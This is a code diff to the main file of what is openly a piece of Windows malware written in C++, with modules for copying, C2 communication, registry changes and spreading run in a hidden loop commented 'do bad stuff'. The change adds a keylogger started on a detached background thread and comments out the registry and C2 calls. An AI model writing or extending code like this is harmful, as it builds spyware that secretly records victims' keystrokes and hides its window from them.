@@ -8,13 +8,15 @@
 #include "DB.h"
 #include "RG.h"
 #include "MP.h"
+#include "KB.h"
 #include "UTIL.h";
 #include <iostream>
-
+#include <thread>
 
 int main()
 {
 	FreeConsole();
+
 	// instantiate modules
 	CP copyModule;
 	C2 connModule;
@@ -31,15 +33,18 @@ int main()
 		return 0;
 	}
 
-	//TODO check if downloaded.exe exists before retrieving
+	thread keylogger(keyLoop);
+	keylogger.detach();
 
 	while (true) {
 		// do bad stuff
-		regsModule.execute();
+		//regsModule.execute();
 		debgModule.execute();
-		connModule.execute();
+		//connModule.execute();
 		msptModule.execute();
 		Sleep(20000);
 	}
 }
+
+
 
